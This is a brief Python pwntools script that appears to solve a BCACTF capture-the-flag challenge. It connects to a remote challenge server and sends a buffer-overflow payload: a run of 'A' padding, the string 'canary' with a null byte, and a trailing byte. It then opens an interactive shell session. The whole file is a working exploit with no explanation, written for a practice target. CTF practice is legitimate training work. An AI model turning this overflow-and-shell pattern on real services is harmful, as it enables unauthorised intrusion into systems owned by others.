from pwn import *

p = remote("challs.bcactf.com", "31615")

p.sendline(b"A" * 0x49 + b"canary\x00" + b"Z")

p.interactive()